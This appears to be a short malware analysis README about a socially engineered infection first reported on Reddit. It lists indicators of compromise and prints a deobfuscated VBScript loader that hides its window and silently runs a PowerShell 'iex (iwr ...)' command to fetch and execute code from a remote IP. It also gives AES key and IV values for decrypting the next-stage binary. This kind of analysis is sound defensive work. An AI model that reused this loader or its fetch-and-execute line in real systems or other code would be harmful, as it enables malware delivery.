# Reddit-Malware

Reddit Thread : https://www.reddit.com/r/msp/comments/1avwvve/customer_fell_for_a_socially_engineered_cyber/


Contacted URL :

```
http://54.87.207.250/QIFPKPIIYICZKANRPZK/LPFVQFELPWXHHIREYRL.txt
http://54.87.207.250/QIFPKPIIYICZKANRPZK/RWWDSRBQMOLKJYJKQWM.txt
http://54.87.207.250/FKAWMCIQISOOSNOEMTS/Password.txt
```

IOCs:

```
Task name : TaskMachineUA{365360DD-2683-46DB-B389-6FF680AC4EA4}
IP : 54.87.207.250
Domain : paste.ee
Domain : showtime24.store
File presence : C:\ProgramData\Local\Microsoft\PackagedEventProviders\LfSvc\365360DD-2683-46DB-B389-6FF680AC4EA4.vbs
```

# Stage 1

Unescape url, replace "Mid" and "Replace" function give us a more readable file, output in 1-stage-output.txt. Some cleaning (remove duplicate and remaning code) give us something like

```html
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -20000,-30000

ZWWWAVGFAFQRVGGECHDSUTIDP="https://www.jaberestaurant.de/#gallery"


Function Main()
CreateObject("WScript.shell").run "powershell iex ( iwr 'http://54.87.207.250/QIFPKPIIYICZKANRPZK/RWWDSRBQMOLKJYJKQWM.txt')", 0, True
End Function
Main

ITPVFHBDBCNCPEBIERCQGNQFH="https://developercommunity.visualstudio.com/t/visual-studio-2022-cant-choose-net-framework-40/1575198"


self.close

```

(I don't know why www[.]jaberestaurant[.]de/#gallery and developercommunity.visualstudio[.]com/t/visual-studio-2022-cant-choose-net-framework-40/1575198 is in the script, they are never called)

# Stage 2

Pretty much the same thing, but mixed with powershell vbscript.

To get the IV and Key, simply print the result of these functions. The string encoded in base64 is encrypted binary

[Cyberchef receipe with encryption key and IV](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'ZdNkp9S8IkSfwVa4VCauYEzchu0w2yu/D9XYurQmW6o%3D'%7D,%7B'option':'Base64','string':'xX/RQrEWsk2T5G1sYipMhA%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)) to get the binary you should paste [line 131 from stage 2](https://github.com/YWxleGlz/Reddit-Malware/blob/d0dbdf8e78c83d626f3c4c3b22c542cce9c4b34e/2-stage-RWWDSRBQMOLKJYJKQWM.txt#L131) without '$FFPQKDAHGHSAFJJCLPEB = "'



Powershell script : https://app.any.run/tasks/8f39aac2-07cd-4fd9-9d5a-af3ca0fbbd17

Binary file : https://www.virustotal.com/gui/file/ace9e8a629f6ba8882afc43198dc9f7e6bf3b723140c2ed28ad36cf2f5786c93?nocache=1
